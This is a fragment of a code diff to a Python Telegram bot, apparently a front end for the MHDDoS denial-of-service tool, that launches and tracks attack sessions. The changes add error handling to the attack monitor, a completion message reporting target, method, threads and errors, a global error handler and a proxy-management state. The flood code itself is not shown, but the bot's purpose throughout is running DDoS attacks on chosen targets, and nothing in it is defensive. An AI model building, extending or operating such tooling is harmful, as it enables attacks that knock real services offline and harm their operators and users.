     async def _monitor_attack(self, query, user_id: int, session: AttackSession) -> None:
         """Monitor attack progress and stop when duration expires."""
         start_time = session.start_time
         duration = session.config.duration
         
-        while session.is_running and time() < start_time + duration:
-            await asyncio.sleep(5)
+        try:
+            while session.is_running and time() < start_time + duration:
+                await asyncio.sleep(5)
+                
+                if not session.is_running:
+                    break
             
-            if not session.is_running:
-                break
-            
-            # Update is tricky in Telegram - we can't edit messages too frequently
-            # Just wait for duration to expire
-        
-        # Stop attack
-        if session.is_running:
-            session.event.clear()
-            session.is_running = False
-            
-            if user_id in self.active_sessions:
-                del self.active_sessions[user_id]
-            
-            # Try to notify user
-            try:
-                await query.message.reply_text(
-                    f"Attack completed.\n\nTarget: {session.config.target}\nDuration: {session.config.duration}s",
-                    reply_markup=self.get_main_menu_keyboard()
-                )
-            except Exception:
-                pass  # Message may have been deleted
+            # Stop attack when duration expires
+            if session.is_running:
+                session.event.clear()
+                session.is_running = False
+                
+                if user_id in self.active_sessions:
+                    del self.active_sessions[user_id]
+                
+                # Calculate final stats
+                elapsed = int(time() - start_time)
+                
+                # Try to notify user
+                try:
+                    msg = (
+                        f"✅ Attack Completed!\n\n"
+                        f"🎯 Target: {session.config.target}\n"
+                        f"⚡ Method: {session.config.method}\n"
+                        f"⏱️ Duration: {elapsed}s\n"
+                        f"🧵 Threads Used: {len(session.threads)}\n"
+                        f"⚠️ Errors: {session.error_count}\n\n"
+                        f"🏠 Main Menu:"
+                    )
+                    await query.message.reply_text(msg, reply_markup=self.get_main_menu_keyboard())
+                except TelegramError as e:
+                    logger.warning(f"Failed to send completion message: {e}")
+                    
+        except asyncio.CancelledError:
+            logger.info(f"Monitor task cancelled for user {user_id}")
+        except Exception as e:
+            logger.error(f"Error in monitor task: {e}\n{traceback.format_exc()}")
+            session.error_count += 1
+            session.last_error = str(e)
     
     def run(self) -> None:
         """Run the bot."""
         application = Application.builder().token(self.token).build()
+        
+        # Add global error handler
+        async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+            """Handle errors in the bot."""
+            logger.error(f"Exception while handling an update: {context.error}")
+            logger.error(traceback.format_exc())
+            
+            # Try to notify user of the error
+            if update and update.effective_user:
+                try:
+                    if update.callback_query:
+                        await update.callback_query.message.reply_text(
+                            f"⚠️ An error occurred: {str(context.error)[:100]}",
+                            reply_markup=self.get_main_menu_keyboard()
+                        )
+                    elif update.message:
+                        await update.message.reply_text(
+                            f"⚠️ An error occurred: {str(context.error)[:100]}",
+                            reply_markup=self.get_main_menu_keyboard()
+                        )
+                except TelegramError:
+                    pass
+        
+        application.add_error_handler(error_handler)
         
         # Create conversation handler
         conv_handler = ConversationHandler(
@@ -1157,6 +1901,9 @@ Memory: {virtual_memory().percent}%
                     MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_tools_input),
                     CallbackQueryHandler(self.button_callback),
                 ],
+                ConversationState.PROXY_MANAGEMENT.value: [
+                    CallbackQueryHandler(self.button_callback),
+                ],
             },
             fallbacks=[
                 CommandHandler("start", self.start_command),
@@ -1172,7 +1919,7 @@ Memory: {virtual_memory().percent}%
         application.add_handler(CommandHandler("status", self.status_command))
         application.add_handler(CommandHandler("stop", self.stop_command))
         
-        logger.info("Starting MHDDoS Telegram Bot...")
+        logger.info(f"Starting MHDDoS Telegram Bot... (Max threads: {SYSTEM_MAX_THREADS})")
         application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 
